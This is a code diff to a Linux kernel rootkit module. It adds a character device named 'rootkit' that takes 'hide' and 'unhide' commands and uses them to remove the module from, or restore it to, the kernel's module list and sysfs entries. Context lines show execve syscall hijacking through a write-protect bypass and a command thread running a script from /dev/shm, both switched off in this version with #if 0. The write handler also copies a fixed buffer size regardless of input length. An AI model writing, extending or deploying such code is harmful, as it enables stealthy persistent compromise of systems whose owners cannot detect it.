@@ -2,7 +2,11 @@
 #include <linux/init.h>
 #include <linux/version.h>
 #include <linux/sched.h>
+#include <linux/fs.h>
+#include <linux/string.h>
+#include <asm/uaccess.h>
 #include <linux/kthread.h>
+#include <linux/kernel.h>
 #include <linux/delay.h>
 #include <linux/kallsyms.h>
 #include <linux/unistd.h>
@@ -13,15 +17,100 @@
 #define RK_DECOY_NAME "httpd"
 #define DEBUG 1
 #define CMD "/dev/shm/rk.sh"
+#define DEVICE_NAME "rootkit"
+#define BUF_SIZE 256
 
+
+#define MIN(a,b) \
+	({ typeof (a) _a = (a); \
+	 typeof (b) _b = (b); \
+	 _a < _b ? _a : _b; })
+
+static int version;
+static int open = 0;
+static char msg_buf[BUF_SIZE];
 struct task_struct *rk_kthread;
 unsigned long *syscall_table = NULL;
 unsigned int hidden = 0;
 pte_t *pte;
+
 static struct list_head *module_previous;
 static struct list_head *module_kobj_previous;
 
 extern unsigned long __force_order;
+
+void rk_hide(void);
+void rk_unhide(void);
+
+static int
+device_open(struct inode *inode, struct file *file)
+{
+	if (open)
+		return -EBUSY;
+
+	open = 1;
+	try_module_get(THIS_MODULE);
+
+	return 0;
+}
+
+static int
+device_release(struct inode *inode, struct file *file)
+{
+	open = 0;
+	module_put(THIS_MODULE);
+	return 0;
+}
+
+static ssize_t
+device_read(struct file *filp, char *buf, size_t length,
+	    loff_t *offset)
+{
+	return 0;
+}
+
+static ssize_t
+device_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
+{
+	if (copy_from_user(msg_buf, buf, BUF_SIZE) != 0) return -EFAULT;
+
+#ifdef DEBUG
+	printk(KERN_INFO "%s: writing %ld characters.", RK_NAME, len);
+	printk(KERN_INFO "%s: writing buf=%s", RK_NAME, msg_buf);
+#endif
+
+	if (!strncmp(msg_buf, "hide", MIN(4, len))) {
+		rk_hide();
+	} else if (!strncmp(msg_buf, "unhide", MIN(6, len))) {
+		rk_unhide();
+	}
+	return len;
+}
+
+static struct file_operations fops = {
+	.read = device_read,
+	.write = device_write,
+	.open = device_open,
+	.release = device_release
+};
+
+int rk_dev_init_module(void)
+{
+	version = register_chrdev(0, DEVICE_NAME, &fops);
+	if (version < 0) {
+#ifdef DEBUG
+		printk(KERN_ALERT "Registering device failed with %d\n", version);
+#endif
+		return version;
+	}
+
+	return 0;
+}
+
+void rk_dev_cleanup_module(void)
+{
+	unregister_chrdev(version, DEVICE_NAME);
+}
 
 asmlinkage int
 (*real_execve)(const char *filename, char *const argv[], char *const envp[]);
@@ -80,8 +169,6 @@ rk_hide(void)
 	hidden = 1;
 }
 
-// TODO: Add a way to call this function.
-// TODO: Maybe implement a device like /dev/null but with hidden features.
 void
 rk_unhide(void)
 {
@@ -89,7 +176,7 @@ rk_unhide(void)
 	if (!hidden) return;
 	list_add(&THIS_MODULE->list, module_previous);
 	_ = kobject_add(&THIS_MODULE->mkobj.kobj,
-			THIS_MODULE->mkobj.kobj.parent, "rt");
+			THIS_MODULE->mkobj.kobj.parent, RK_NAME);
 
 	hidden = 0;
 }
@@ -97,8 +184,8 @@ rk_unhide(void)
 inline void rk_write_cr0(unsigned long cr0) {
 	asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
 }
-void
 
+void
 rk_hijack_execve(void)
 {
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5,3,0)
@@ -165,8 +252,11 @@ rk_init(void)
 #else
 	rk_hide();
 #endif
+	rk_dev_init_module();
+#if 0
 	rk_hijack_execve();
 	rk_start_cmd_thread();
+#endif
 	return 0;
 }
 
@@ -177,8 +267,11 @@ rk_exit(void)
 #ifdef DEBUG
 	pr_info("%s: module un-loaded at 0x%p\n", RK_NAME, rk_exit);
 #endif
+	rk_dev_cleanup_module();
+#if 0
 	rk_unhijack_execve();
 	kthread_stop(rk_kthread);
+#endif
 }
 
 module_init(rk_init);
